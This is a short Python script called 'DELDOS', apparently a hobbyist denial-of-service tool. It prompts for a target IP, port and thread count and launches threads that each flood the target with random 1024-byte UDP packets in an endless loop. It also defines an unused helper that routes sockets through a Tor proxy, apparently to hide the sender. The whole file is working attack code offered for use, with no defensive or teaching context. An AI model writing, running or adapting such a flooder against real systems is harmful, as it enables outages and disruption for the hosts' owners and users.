import threading
import socket
import random
import time
import sys
import socks
import subprocess
import os

def clear_screen():
    if os.name == 'nt':
      os.system('cls')
    else:
      os.system('clear')

# ASCII Art
ascii_art = """
██████╗ ███████╗██╗     ██████╗  ██████╗ ███████╗
██╔══██╗██╔════╝██║     ██╔══██╗██╔═══██╗██╔════╝
██║  ██║█████╗  ██║     ██║  ██║██║   ██║███████╗
██║  ██║██╔══╝  ██║     ██║  ██║██║   ██║╚════██║
██████╔╝███████╗███████╗██████╔╝╚██████╔╝███████║
╚═════╝ ╚══════╝╚══════╝╚═════╝  ╚═════╝ ╚══════╝

         D E L D O S

"""
print(ascii_art)

def use_tor_proxy():
    socks.set_default_proxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050)
    socket.socket = socks.socksocket 

def attack(target, port, thread_id):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    packet = random._urandom(1024)  # Pacote de 1024 bytes
    
    while True:
        try:
            sock.sendto(packet, (target, port))
            print(f"[THREAD-{thread_id}] Packet sent to {target}:{port}")
        except Exception as e:
            print(f"[THREAD-{thread_id}] Error: {e}")
            break

if __name__ == "__main__":
    target = input("Enter target IP: ")
    port = int(input("Enter target port: "))
    threads = int(input("Enter number of threads: "))
    
    print("Starting attack...")
    time.sleep(2)
    
    for i in range(threads):
        thread = threading.Thread(target=attack, args=(target, port, i))
        thread.start()
    
    print("Attack started successfully!")
